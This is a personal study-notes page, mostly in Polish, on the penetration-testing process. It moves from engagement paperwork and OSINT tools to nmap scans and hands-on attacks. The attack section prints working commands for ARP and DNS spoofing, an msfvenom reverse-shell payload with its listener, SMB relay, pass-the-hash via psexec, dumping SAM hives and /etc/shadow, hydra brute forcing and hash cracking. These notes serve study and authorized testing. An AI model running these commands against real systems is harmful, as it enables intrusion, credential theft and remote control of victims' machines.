<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="X-UA-Compatible" content="ie=edge" />
<link rel="stylesheet" href="/_assets/main.css" />

    <title>Overall Pentesting Process - Notatki</title>
  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
  <body>
    <div class="main">
      <nav class="navigation">
        <a href="/">Notatki</a>
      </nav>
      <article>
        <header>
          <h1 class="article-title">Overall Pentesting Process</h1>
          <div class="article-info">
            <div>
              <span
                >Created At：<time datetime="1660108141110"
                  >2022-08-10 01:09</time
                ></span
              >
              <span
                >Updated At：<time datetime="1660901525282"
                  >2022-08-19 05:32</time
                ></span
              >
            </div>
            
          </div>
        </header>
        <div class="article-content markdown-body"><h1 id="1-planning-and-scoping">1. Planning and Scoping</h1>
<ol>
<li>Initial information gathering
Understand the magnitude of the pentest
<ul>
<li>How many IPs will be tested?</li>
<li>How many assets?</li>
<li>How many URLs? How many pages per URL?
Understand the detection capabilities</li>
<li>Are there any WAF or next gen firewall?</li>
</ul>
</li>
<li>Create, review and sign agreements</li>
<li>Refine assets in scope</li>
<li>Define attacks and methodologies</li>
<li>Define rules of engagement</li>
</ol>
<p><strong>Types of penetration testing</strong>
Internal, external, web application, IoT, mobile, etc.
Black-box vs. grey-box vs white-box
<strong>Main Pentest Methodologies and Frameworks</strong> (The overall pentest process)</p>
<ul>
<li>PTES <a title="http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines" href="http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines">http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines</a></li>
<li>OWASP, mainly focused on Web Applications,  <a title="https://owasp.org/" href="https://owasp.org/">https://owasp.org/</a></li>
<li>MITRE ATT&amp;CK, framework for adversary emulation</li>
<li>NIST, non-regulatory agency of the US</li>
<li>OSSTMM, in-depth description of each step of a penetration testing</li>
<li>ISSAF, covers some of the most common attacks and tools. With a lot of practical examples</li>
</ul>
<p><strong>Most Common Compliance Standards</strong> (normy bezpieczeństwa)</p>
<ul>
<li>PCI-DSS</li>
<li>GDPR</li>
<li>HIPAA</li>
<li>SOX</li>
<li>NERC-CIP</li>
<li>ISO27001</li>
</ul>
<p><strong>The Importance of Paperwork</strong>
<em>Non-Disclosure Agreements (NDAs):</em> Ensure that the information discussed during the pentest will not be released to anyone outside of the project, hefty fines for breaking confidentiality rules
Also known as: Confidentiality Agreement (CA), Confidential Disclosure Agreement (CDA), Proprietary Information Agreement (PIA)
<em>Master Service Agreements (MSA)</em> Includes terms such as: how invoices will be sent, how payments will be made, ownership of intellectual properties, etc.
<em>Statement of Work (SOW)</em> Documents the details of a specific project, one SOW per pentest engagement, define things such as: assets in scope, project deliverables, price for the services, etc. You can have multiple SOWs for a client while having just one MSA
<em>Permission to Attack</em> Also known as “Get-Out-of-Jail-Free” cards, a document authorizing you to perform the attacks, Describe the attacks and dates of the tests, signed by a high-level executive in the client, includes their contact information, it is what differentiates you from a criminal</p>
<h1 id="2-information-gathering">2. Information Gathering</h1>
<p><strong>Main relevant information</strong>: Names, titles, email addresses, LinkedIn profiles, identity, public documents, etc.</p>
<h2 id="open-source-intelligence-osint">Open Source Intelligence (OSINT):</h2>
<p><em>Main passive techniques</em>: Search engine enumeration, social media, job postings, etc.
<em>Main active techniques</em>: Social engineering, phishing attempts, etc.</p>
<p><strong>Main sources of data and main tools</strong>: For both passive and active techniques
<em>search engines</em> (google, bing,baidou, shodan), social media (fb, linkedin, instagram, job posting),
<em>third party databases</em> (threat intelig. platforms, data breach compilation, web archive, WHOIS, certificate db)
<em>passive info gathering tools</em>: OWASP Amass, Sn1per, Maltego, Recon-NG, theHarvester</p>
<p><strong>Searh engine enumeriation</strong></p>
<ul>
<li>google dorks, <a title="https://www.exploit-db.com/google-hacking-database" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a> (site:nasa.gov, filetype:pdf(log), allintext:user, intitle:“Index of /”)</li>
<li>shodan (search for tehnologies and services: find server with port 21 open, search for metadata)</li>
<li>password dump databases(HaveIBeenPwned, wyciek “collection #1-#5”)</li>
<li>website archives: <a title="https://web.archive.org/" href="https://web.archive.org/">https://web.archive.org/</a></li>
<li>CVE/CWE searches, public document enumeration</li>
</ul>
<hr />
<h2 id="narzędzia-passive">Narzędzia (passive)</h2>
<h3 id="theharvester">theHarvester</h3>
<p>It performs open source intelligence (OSINT) gathering to help determine a domain’s external threat landscape. The tool gathers names, emails, IPs, subdomains, and URLs by using multiple public resources
Enumerating search engines and scrapping  social media: Subdomains, hosts and IPs,  Email addresses, Twitter accounts, LinkedIn profiles</p>
<div><pre class="hljs"><code>theHarvester -d kali.org
<span class="hljs-comment"># -d kali.org -domena</span></code></pre></div>
<h3 id="recon-ng">Recon-ng</h3>
<p>Recon-ng is a full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly.
<strong>domain host enumeration</strong>
install module</p>
<div><pre class="hljs"><code>marketplace search
marketplace install (nazwa co chcemy zainstalować)
module load (nazwa)
info	-informacje jak posługiwać się modułem, manual</code></pre></div>
<h3 id="sn1per">Sn1per</h3>
<h3 id="maltego">Maltego</h3>
<h3 id="spiderfoot">SpiderFoot</h3>
<h3 id="owas-amass">OWAS Amass</h3>
<p><a title="https://github.com/OWASP/Amass/blob/master/doc/user_guide.md" href="https://github.com/OWASP/Amass/blob/master/doc/user_guide.md">https://github.com/OWASP/Amass/blob/master/doc/user_guide.md</a></p>
<h3 id="github-elevenpathfoca">github ElevenPath/FOCA</h3>
<p>use search engines for document, extract metadata</p>
<h3 id="github-opsdiskmeatgoofil">github opsdisk/meatgoofil</h3>
<p>automate document search, githube search</p>
<h3 id="gitleaks-httpsgithubcomzricethezavgitleaks">GitLeaks -<a title="https://github.com/zricethezav/gitleaks" href="https://github.com/zricethezav/gitleaks">https://github.com/zricethezav/gitleaks</a></h3>
<p>przeszukuje repozytorium git w poszukiwaniu wrażliwych danych</p>
<h3 id="trufflehog-httpsgithubcomtrufflesecuritytrufflehog">TruffleHog- <a title="https://github.com/trufflesecurity/TruffleHog" href="https://github.com/trufflesecurity/TruffleHog">https://github.com/trufflesecurity/TruffleHog</a></h3>
<p>Find leaked credentials. git, github, gitlab, S3, filesystem, syslog, file and stdin (coming soon)
używa Regex do znalezienia możliwych wyciekóſ
plik z regexami:</p>
<div><pre class="hljs"><code>/usr/li/python3/dist-packages/truffleHogRegex/regexes.json</code></pre></div>
<div><pre class="hljs"><code>trufflehog --regex --entropy=False &lt;link_do_github_repo&gt;
<span class="hljs-comment"># --regex </span>
<span class="hljs-comment"># --entropy=False </span></code></pre></div>
<h3 id="metagofill">metagofill</h3>
<p>metagoofil searches Google for specific types of files being publicly hosted on a web site and optionally downloads them to your local box.
<a title="https://github.com/opsdisk/metagoofil" href="https://github.com/opsdisk/metagoofil">https://github.com/opsdisk/metagoofil</a></p>
<div><pre class="hljs"><code>metagofill -d microsoft.com -t pdf -l 200 -n 10</code></pre></div>
<p>przydatne w połączeniu z narzędziem <em>exiftool</em> do wydobywania metadanych z plików</p>
<h2 id="actively-gathering-port-and-service-information">Actively Gathering Port and Service Information</h2>
<h3 id="nmap-scripts">NMAP scripts</h3>
<div><pre class="hljs"><code>nmap -p 21,22,80,443 10.10.56.0/24 <span class="hljs-comment">#znajdź wszystkie hosty z podanego zakresu mające otwarte porty p</span>
nmap 192.168.18.10-25 <span class="hljs-comment"># skanuj każdy adres z zakresu</span>
nmap 192.168.*.10 <span class="hljs-comment"># zastąpi * liczbami 0-255 i każdy adres przeskanuje </span>
nmap localhost <span class="hljs-comment"># skanuj siebie</span>
nmap -iL targets.txt <span class="hljs-comment"># skanuj listę celi</span>
<span class="hljs-comment"># -iL -read target specifications from file</span>
<span class="hljs-comment"># -F - top 100 ports</span>
<span class="hljs-comment"># -T -speed of scan (0-5)</span></code></pre></div>
<p><strong>1.  host discovery</strong> w sieci</p>
<div><pre class="hljs"><code>nmap -sn IP
nmap -sn 192.168.0.1-254 **lub** nmap -sn 192.168.0.0/24</code></pre></div>
<p><strong>2.  port scan</strong></p>
<div><pre class="hljs"><code>nmap -p- --min-rate=1000 IP
nmap -sU -p- --min-rate=1000 IP

<span class="hljs-comment"># -sS domyślnie skan  -niepełny 3 way handshake, stealth("nie zauważalny tak po chuju bo pakiety są puste i podejrzane, zwykły skan mniej się rzuca w oczy")</span>
<span class="hljs-comment"># -sT -skanowanie z pełnym 3 way handshake</span>
<span class="hljs-comment"># -sU skan UDP</span>
<span class="hljs-comment"># -p- -wszystkie porty</span>
<span class="hljs-comment"># --open: Only show open (or possibly open) ports</span>
<span class="hljs-comment"># --min-rate=1000 1000 pakietów na s</span>
<span class="hljs-comment"># --top-ports 20 -20 najczęstrzych portów</span></code></pre></div>
<p><strong>NMAP Script Engine</strong></p>
<div><pre class="hljs"><code>nmap --script broadcast-ping <span class="hljs-comment"># host discovery w sieci</span>
nmap -sL --script=targets-sniffer -e th0 <span class="hljs-comment">#packet sniffer</span>
nmap -sV --script=vuln 192.168.2.131 <span class="hljs-comment"># sprawdza podatności na jakie może być wrażliwy host </span></code></pre></div>
<p><strong>2. Dalsze skanowanie portów</strong></p>
<div><pre class="hljs"><code>nmap -p {wcześniej znalezione porty} IP -vv -<span class="hljs-keyword">sC </span>-sV

<span class="hljs-comment"># -vv verbose- więcej "v", więcej opisu</span>
<span class="hljs-comment"># -sC - --script=default</span>
<span class="hljs-comment"># -sV -service version</span>
<span class="hljs-comment"># -O -OS detection</span>
<span class="hljs-comment"># -oN/-oX/-oS/-oG/-oA &lt;file&gt; -wynik skanowania zapisany w foramtach normal, XML, s|rIpt kIddi3, grepable format, w 3 pierwszych foramtach na raz i nazwa pliku</span>
<span class="hljs-comment"># --script=  *(folder ze skryptami /usr/share/nmap/scripts)</span>
    - vuln
    - smb-enum-<span class="hljs-keyword">shares </span>(enumerate smb <span class="hljs-keyword">shares)
</span>    - smb-vuln-ms<span class="hljs-number">-010</span> - czy serwer <span class="hljs-keyword">jest </span>wrażliwy na podatność Eternal <span class="hljs-keyword">Blue </span>
    - ftp-anon (FTP anonymous login)
    - http-title
<span class="hljs-comment"># --open</span>
<span class="hljs-comment"># -A -agresive</span></code></pre></div>
<h3 id="openvas-green-bone">OpenVAS (Green Bone)</h3>
<p><a title="https://www.greenbone.net/en/" href="https://www.greenbone.net/en/">https://www.greenbone.net/en/</a></p>
<h3 id="wpscan">WPScan</h3>
<p>Word press skaner
można dostać aklucz API ze strony <a title="https://wpscan.com/wordpress-security-scanner" href="https://wpscan.com/wordpress-security-scanner">https://wpscan.com/wordpress-security-scanner</a> i używać automatu połączonego z chmurą WPScan</p>
<div><pre class="hljs"><code>wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//192.168.2.49</span> <span class="hljs-params">--api-token</span> {token}
<span class="hljs-comment"># --url -adres</span>
</code></pre></div>
<h3 id="metasploit">Metasploit</h3>
<div><pre class="hljs"><code><span class="hljs-attribute">msfconsole</span> <span class="hljs-comment"># włącz metasploit framework</span></code></pre></div>
<h3 id="sqlmap-opisać-ważny-do-egzaminu">SQLMap - opisać, ważny do egzaminu</h3>
<h3 id="owaspzap">OWASPZap</h3>
<h3 id="burp-suite">Burp Suite</h3>
<h3 id="nexpose-community">Nexpose Community</h3>
<p><strong>Website scraping and crawling</strong></p>
<h3 id="set-tolkit">SET Tolkit</h3>
<p><a title="https://github.com/trustedsec/social-engineer-toolkit" href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a>
The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. SET has a number of custom attack vectors that allow you to make a believable attack quickly. SET is a product of TrustedSec, LLC – an information security consulting firm located in Cleveland, Ohio.
pozwala na przykład skopiować stronę internetową logowania do serwisu, wygląda legitnie, użytkownik się loguje <em>normalnie</em>, w konsoli set pokazuje dane użytkownika do logowania, które przechwycił</p>
<h3 id="eyewitness">EyeWitness</h3>
<h3 id="dirb-opisać-ważny-do-egzaminu">Dirb - opisać, ważny do egzaminu</h3>
<p>Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.
enumeruje podstrony metodą bruteforce</p>
<h3 id="nikto">Nikto</h3>
<h3 id="commercial-tools">Commercial Tools</h3>
<p>xQualys, Nessus, Rapid7 Nexpose, Tenable,  F-Secure Radar, Tripwire IP360,  Burp Suite Pro, Metasploit Pro, etc.</p>
<h1 id="3-vulnerability-analysis">3. Vulnerability Analysis</h1>
<h1 id="4-exploitation">4. Exploitation</h1>
<h2 id="attack-against">Attack against</h2>
<p>Confidentiality,
Integrity (exploit trust existing betwen two entities): Data diddling, Salami attacks, Phishing
Availability (dostępność usług): DOS, DDOS, jamming, de-authentication attack, Telephone jamming, Power cut, Environment attacks</p>
<h2 id="attack-and-exploit-resources">Attack and Exploit Resources</h2>
<p>Mitre Att&amp;ck <a title="https://attack.mitre.org" href="https://attack.mitre.org">https://attack.mitre.org</a>
Attack and Exploit Resources CISA <a title="https://www.cisa.gov" href="https://www.cisa.gov">https://www.cisa.gov</a>
Microsoft <a title="https://docs.microsoft.com/en-us/security-updates" href="https://docs.microsoft.com/en-us/security-updates">https://docs.microsoft.com/en-us/security-updates</a>
Packet Storm Security <a title="https://packetstormsecurity.com" href="https://packetstormsecurity.com">https://packetstormsecurity.com</a>
Exploit Database <a title="https://www.exploit-db.com" href="https://www.exploit-db.com">https://www.exploit-db.com</a></p>
<h2 id="network-attacks">Network attacks</h2>
<h3 id="arp-spoofing">ARP spoofing</h3>
<p>ARP- link mac addres of interfacewith IP addres,
działanie: broadcast Who has 192.168.2.11, jeden host odpowiada i podaje swój MAC. ARP Spoofing- podszywanie się atakująćego pod Default Gateway<br />
<strong>arpspoof</strong> - najpopularniejsze, przekierowuje pakiety w sieci fałszując odpowiedzi w ARP
inne: Ettercap, Arpison, Cain and Abel
najpierw trzeba włączyć ip forwarding</p>
<div><pre class="hljs"><code>echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/ip_forward </code></pre></div>
<p>oszukiwanie hosta, podszywnaie się pod default gateway</p>
<div><pre class="hljs"><code><span class="hljs-attribute">arpspoof</span> -i eth0 -t <span class="hljs-number">192.168.2.10</span> <span class="hljs-number">192.168.2.1</span> -r</code></pre></div>
<p>oszukiwanie default gateway, podszywnaie się pod hosta</p>
<div><pre class="hljs"><code><span class="hljs-attribute">arpspoof</span> -i eth0 -t <span class="hljs-number">192.168.2.1</span> <span class="hljs-number">192.168.2.10</span> -r 
<span class="hljs-comment"># -i eth0 -mój interfejs podłączony do atakowanej sieci</span>
<span class="hljs-comment"># -t 192.168.2.10 -TARGET, host do którego wysyłane są oszukane pakiety, jeśli nie podany to zatruwa wszystkie hosty w sieci</span>
<span class="hljs-comment"># 192.168.2.1 -host pod którego się podszywamy (default gateway) </span>
<span class="hljs-comment"># -r -przechwytywanie ruchu w obu kierunkach</span></code></pre></div>
<h3 id="mac-spoofing">MAC spoofing</h3>
<p>Why:
protect privacy- device tracking (static MAC)
gain free acces to service
gain unauthorised acces to a network (MAC filtering na urządzeniach, np WiFi)
<strong>programy</strong>: Technitium MAC, NoVirus Thanks MAC, Smart MAC, SMAC MAC, Spoof-Me-Now
z terminala:</p>
<div><pre class="hljs"><code><span class="hljs-attribute">ifconfig</span> eth0 down  			-położenie interfejsu
<span class="hljs-attribute">ifconfig</span> hw ether <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> 	-zmiana MAC na wybrany
<span class="hljs-attribute">ifconfig</span> eth0 up			-podniesienie interfejsu</code></pre></div>
<h3 id="switch-spoofing">Switch spoofing</h3>
<p>VLAN hopping attack
DTP (Dynamic Trunking Protocol)- automatyczne tworzneie łącz typu Trunk między switchami (CISCO chyba tylko), jeśli switch jest źle skonfigurowany (port w trybie Dynamic desirable, Dynamic auto, Trunk) to można stworzyć łącze Trunk między switchem, a podłączonym atakującym hostem udająć switch. Obrona to wyłączenie protokołów w switchu lub zmiana na <em>switchport mode acces</em>
<strong>progrmay</strong>: Yersinia- layer 2 attacks (przeciwko protokołom DTP, VTP, ISL)</p>
<h3 id="replay-and-relay-attacks">Replay and relay attacks</h3>
<p><strong>programy</strong>: Metasploit, Responder, Inveigh,</p>
<h3 id="responder">Responder</h3>
<p>pozwala uzyskać credsy, zatruwa jakiś protokół</p>
<div><pre class="hljs"><code>responder -<span class="hljs-selector-tag">I</span> eth0 -wrf</code></pre></div>
<h4 id="smb-relay-attack">SMB Relay Attack</h4>
<p>Admin chce połączyć się z bazą danych, atakujący staje między i zahowuje się jak proxy dla admina i bazy, przekazuje pakiety między nimi, admin przekazuje credsy admina i przekazuje je jako swoje</p>
<div><pre class="hljs"><code><span class="hljs-comment"># tworzenie payloda dla bazy danych, który spowoduje nawiązanie sesji revese TCP</span>
msfvenom -p windows/meterpreter/reverse_tcp -a x86 <span class="hljs-attribute">LHOST</span>=192.168.2.121 <span class="hljs-attribute">LPORT</span>=4321 -f exe &gt; smb_rev.exe
-p -payload  
-a -target arhitecture
<span class="hljs-attribute">LHOST</span>=192.168.2.121 <span class="hljs-attribute">LPORT</span>=4321 -adres i<span class="hljs-built_in"> port </span>atakującej maszyny dla reverse TCP, mój adres i<span class="hljs-built_in"> port
</span>-f -msfvenom ma stworzyć windows executable
smb_rev.exe -nazwa stworzonego payloadu</code></pre></div>
<div><pre class="hljs"><code><span class="hljs-comment"># tworzenie listenera dla połączenia zwrotnego nawiązywanego przez payload</span>
msfconsole
use exploit/multi/handler
<span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp
<span class="hljs-built_in">set</span> LHOST 192.168.2.121
<span class="hljs-built_in">set</span> LPORT 4321
run</code></pre></div>
<p>Włączanie ataku SMB Realay Attack</p>
<div><pre class="hljs"><code><span class="hljs-keyword">python3</span> smbrelayx.<span class="hljs-keyword">py</span> -h <span class="hljs-number">192.168</span>.<span class="hljs-number">2.15</span> -<span class="hljs-keyword">e</span> smb_rev.<span class="hljs-keyword">exe</span>
-h <span class="hljs-number">192.168</span>.<span class="hljs-number">2.15</span> -target, baza danych
-<span class="hljs-keyword">e</span> smb_rev.<span class="hljs-keyword">exe</span> -uruchom binarkę smb_rev.<span class="hljs-keyword">exe</span></code></pre></div>
<p>po uruchomieniu program czeka na próbę autentykacji między adminem, a serwerem, wyożystuje ją, metasploit przechwytuje połączenie i daje reverse shell do serwera SMB</p>
<h3 id="dns-spoofing">DNS spoofing</h3>
<p>Windows: klienci łączący sie  z usługami MS Service wykorzystają NetBIOS resolution), Hostname resolution przy połączeniu TCP/IP nie do zasobów MS
MS Host name reolution order:</p>
<ol>
<li>Is it me?</li>
<li>Local host file C:\Windows\System32\drivers\etc (owner Admin)</li>
<li>Query Domain Name Service</li>
<li>Multicast query (czy ktoś inny zna adres IP domeny z którą chcę się połączyć)</li>
</ol>
<p><strong>programy</strong>: <strong>dnsspoof</strong>, Ettercap, Bettercap
Przykład:
Default Gateway: 192.168.2.1
Victim: 192.168.2.10
Fake Website: 192.168.2.20</p>
<ol>
<li>Utworzenie fałszywej strony</li>
</ol>
<div><pre class="hljs"><code><span class="hljs-keyword">cd</span> /tmp
<span class="hljs-keyword">cp</span> ~/my_fake_websites/<span class="hljs-built_in">index</span>.html .
<span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> http.server</code></pre></div>
<ol start="2">
<li>ARP spoofing, podszywanie się pod DG</li>
</ol>
<div><pre class="hljs"><code><span class="hljs-attribute">echo</span> <span class="hljs-number">1</span> &gt; /proc/sys/net/ipv4/ip_forward 
<span class="hljs-attribute">arpspoof</span> -i eth0 -t <span class="hljs-number">192.168.2.10</span> <span class="hljs-number">192.168.2.1</span>
<span class="hljs-attribute">arpspoof</span> -i eth0 -t <span class="hljs-number">192.168.2.1</span> <span class="hljs-number">192.168.2.10</span></code></pre></div>
<ol start="3">
<li>Stworzenie pliku z fałszywym wpisem DNS</li>
</ol>
<div><pre class="hljs"><code><span class="hljs-attribute">echo</span> <span class="hljs-number">192.168.2.20</span> www.globomantics.com&gt; poisoned_hosts.txt</code></pre></div>
<ol start="4">
<li>Zatrucie DNS</li>
</ol>
<div><pre class="hljs"><code>dnsspoof -<span class="hljs-selector-tag">i</span> eth0 -f poisoned_hosts<span class="hljs-selector-class">.txt</span>
-<span class="hljs-selector-tag">i</span> eth0 -interfejs z któ¶ego nadaję
-f poisoned_hosts<span class="hljs-selector-class">.txt</span> -plik ze spreparowanym wpisem DNS</code></pre></div>
<ol start="5">
<li>Sprawdzenie czy atak zadziałał, nazwa <em>www.globomantics.com</em> powinna prowadzić do <em>192.168.2.20</em></li>
</ol>
<div><pre class="hljs"><code><span class="hljs-attribute">nslookup</span> www.globomantics.com</code></pre></div>
<h2 id="password-attacks">Password attacks</h2>
<h3 id="account-lockout">Account Lockout</h3>
<p>zablokowanie konta poprzez wielokrotne podanie złego hasła- password guessing
czy accout lockout jest włączone</p>
<div><pre class="hljs"><code>&gt; net accounts (Windows)
<span class="hljs-keyword">grep</span> tally <span class="hljs-regexp">/etc/</span>pam.conf (Linux)
lub <span class="hljs-regexp">/etc/</span>pam.d</code></pre></div>
<p>Jeśli jest włączone to przetestować: próbować zalogować się wielokrotnie błędnie, w krótkim czasie, sprawdzić czy lockout zadziałał i nie można się zalogować (credsy dostać od admina)
<strong>Password guessing</strong> with <strong>THC hydra</strong>: brute force attack przeciwko serwerowi ssh, każda możliwa kombinacja z user i password
w wypadku zatrzymania/crashu hydry, zostawia po sobie plik hydra.restore do odnowienia sesji</p>
<div><pre class="hljs"><code><span class="hljs-attribute">hydra</span> -L users.txt -P passwords.txt -t <span class="hljs-number">6</span> ssh://<span class="hljs-number">192.168.2.20</span> -u
<span class="hljs-comment"># -L -plik tekstowy z loginami</span>
<span class="hljs-comment"># -P -plik tekstowy z hasłami</span>
<span class="hljs-comment"># -t6 -threads/wątki</span>
<span class="hljs-comment"># -u -password spraying (dla każdego hasła po kolei użytkownik, domyślnie to na użytkownika każde hasło i następny użytkownik)</span></code></pre></div>
<p><strong>Dictionary Attacks</strong> ??? (znaleźć program któ¶y na podstawie danych o osobie wytworzy słownik )
<strong>Obtaining Linux password representation</strong></p>
<div><pre class="hljs"><code><span class="hljs-regexp">/etc/</span>passwd
<span class="hljs-regexp">/etc/</span>shadow</code></pre></div>
<div><pre class="hljs"><code>unshadow <span class="hljs-regexp">/etc/</span>passwd <span class="hljs-regexp">/etc/</span>shadow &gt; crack.passwd.db -odszyfruj hasła linux <span class="hljs-keyword">do</span> pliku</code></pre></div>
<p><strong>Obtaining Windows password representation</strong> (roziwnąć się kiedyś w tym)<br />
Registry Hives: SAM  (Security Account Manager), system, Security; Memory;Windows Credential Manager; Active Directory database; Network Service accounts;</p>
<div><pre class="hljs"><code>&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\sam c:\temp\sam.<span class="hljs-keyword">save</span>
&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\system c:\temp\sam.<span class="hljs-keyword">save</span>
&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\security c:\temp\sam.<span class="hljs-keyword">save</span></code></pre></div>
<h3 id="pass-the-hash">Pass-the-hash</h3>
<p>nie uwieżytelnianie się hasłem tylko wysyłanie juz hasha hasła</p>
<div><pre class="hljs"><code>msf6 &gt; use exploit/windows/smb/psexec
msf6 &gt; <span class="hljs-built_in">set</span> RHOST 192.168.2.11
msf6 &gt; <span class="hljs-built_in">set</span> SMBUser Bob
msf6 &gt; <span class="hljs-built_in">set</span> SMBPass ASDaDSFsDGasfvaeRbAEFVAsFVa<span class="hljs-built_in">..</span>. (users hash)
msf6 &gt; <span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp
msf6 &gt; run</code></pre></div>
<h3 id="password-cracking">Password Cracking</h3>
<p><strong>John-the-ripper</strong> modes: single crack, wordlist, incremental</p>
<div><pre class="hljs"><code><span class="hljs-string">john</span> <span class="hljs-built_in">--list=formats</span> <span class="hljs-comment"># lista foramtów jakie może złamać</span>
<span class="hljs-string">locate</span> *<span class="hljs-string">2john</span>* <span class="hljs-comment"># moduły pozwalający obliczyć hash pliku</span>
<span class="hljs-string">zip2john</span> &lt;<span class="hljs-string">plik</span>&gt; &gt; &lt;<span class="hljs-string">jtr_secret_hash</span>.<span class="hljs-string">txt</span>&gt; <span class="hljs-comment">#generowanie hasha pliku i zapisanie go w pliku tekstowym</span>
<span class="hljs-string">john</span> &lt;<span class="hljs-string">jtr_secret_hash</span>.<span class="hljs-string">txt</span>&gt; <span class="hljs-built_in">--word-list=&lt;word_list.txt&gt;</span> <span class="hljs-comment"># crack hashy z pliku</span>

<span class="hljs-string">john</span> <span class="hljs-string">crack</span>.<span class="hljs-string">passwd</span>.<span class="hljs-string">db</span>		<span class="hljs-comment"># basic use	</span>
<span class="hljs-string">john</span> <span class="hljs-built_in">--worldlist=/usr/share/john/password.lst</span> <span class="hljs-built_in">--format=crypt</span> <span class="hljs-built_in">--rules</span> <span class="hljs-string">crack</span>.<span class="hljs-string">passwd</span>.<span class="hljs-string">sb</span>
<span class="hljs-comment"># --worldlist=/usr/share/john/password.lst 	-wordlista</span>
<span class="hljs-comment"># --format=crypt 	-hash format</span>
<span class="hljs-comment"># --rules 	-mieszanie haseł robiąć z nich subzbiory, zwiększa różnorodność haseł </span>
<span class="hljs-comment"># crack.passwd.sb</span></code></pre></div>
<p><strong>Hashcat</strong></p>
<div><pre class="hljs"><code>hashcat --help
hashcat -m <span class="hljs-number">500</span> example500.hash <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>password.lst 
# -m <span class="hljs-number">500</span>	-hash type (<span class="hljs-number">500</span>=md5)
# example500.hash 	-plik zawierający hash hasła <span class="hljs-keyword">do</span> rozszyfrowania
# <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>password.lst	-word list</code></pre></div>
<p><strong>ophcrack</strong>: Rainbow tables</p>
<div><pre class="hljs"><code>ophcrack -g -d /<span class="hljs-type">path</span>/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">tables</span> -t xp_free_fast,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>:vista_free -f hash.txt
-g -<span class="hljs-keyword">disable</span> gui
-d /<span class="hljs-type">path</span>/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">tables</span>	-base <span class="hljs-type">path</span> <span class="hljs-keyword">to</span> rainbow <span class="hljs-keyword">tables</span> 
-t xp_free_fast,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>:vista_free -specify <span class="hljs-keyword">tables</span> <span class="hljs-keyword">to</span> use
-f hash.txt	-file containing hashes <span class="hljs-keyword">to</span> be cracked</code></pre></div>
<p><strong>Cain and Abel</strong> (windows, nie suportowany)</p>
<h3 id="kerberoasting">Kerberoasting</h3>
<p>service account attacks
credsy są skradzione z pamięci, crackowane offline, …
programy: <strong>powersploit, empire</strong>, automatyzują</p>
<h2 id="attacking-wireless-networks">Attacking wireless networks</h2>
<p>Against Confidentiality: Evil twin, Bluesnarfing
Against Integrity: WPS PIN attack, RFID cloning,
Against Availability: Jamming, Deauthentication attack
<strong>programy</strong>: Air-crack-ng (<a title="https://www.aircrack-ng.org" href="https://www.aircrack-ng.org">https://www.aircrack-ng.org</a>), Kismet (<a title="https://www.kismetwireless.net" href="https://www.kismetwireless.net">https://www.kismetwireless.net</a>)(bt, sdr i inne wyspecjalizowane urządzenia), Wifite2 (<a title="https://github.com/derv82/wifite2" href="https://github.com/derv82/wifite2">https://github.com/derv82/wifite2</a>)</p>
<h3 id="aircrack-ng-suite">aircrack-ng suite</h3>
<p>airmon-ng -enable monitor mode on wireless interface, itd
aireplay-ng -inject packets into a wireless network to generate traffic,
airodump-ng -capture frames, może logować położenie GPS sieci jeśli jest dodatkowe urządzenie jest dołączone
aircrack-ng -szuka kluczy w przechwyconych pakietach,</p>
<div><pre class="hljs"><code>iwconfig <span class="hljs-comment">#list and identify local wireless network interface device </span>
airmon-ng<span class="hljs-built_in"> check </span>wlan0 <span class="hljs-comment">#czy są jakies procesy które mogą interferować z pracą aircrack-ng suite </span>
airmon-ng<span class="hljs-built_in"> check </span>kill <span class="hljs-comment">#ubij procesy przeszkadzające</span>
airmon-ng start wlan0 <span class="hljs-comment">#przełącz interfejs w tryb MONITOR</span>
iwconfig <span class="hljs-comment"># sprawdzeie czy interfejs przeszedł w tryb monitor i ma nową nazwę</span>
airodump-ng wlan0mon <span class="hljs-comment">#dump pakietów z ze skonfigurowanego interfejsu</span>
airodump-ng wlan0mon --bssid &lt;bssid&gt; --channel &lt;channel_nr&gt; --write &lt;file_to_write&gt; <span class="hljs-comment"># dump pakietów z dokładnie określonego Broadcast SSID i kanału, zapisanie do pliku wyników</span>
aireply-ng --fakeauth 0 -a &lt;accespoint_MAC(BSSID)&gt; wlan0 -h &lt;source_MAC_address(podszywam_się_pod_niego)&gt;</code></pre></div>
<p><strong>żeby zmienić kanał na którym chce się nadawać trzeba najpier ustawić kartę na nasłuch na wybranym kanale i później można nadawać, nie ma możliwośći bezpośredniego ustawienia kanałów</strong></p>
<h3 id="wifite">wifite</h3>
<h3 id="scapy">SCAPY</h3>
<p><strong>mocne, zainteresować się</strong>
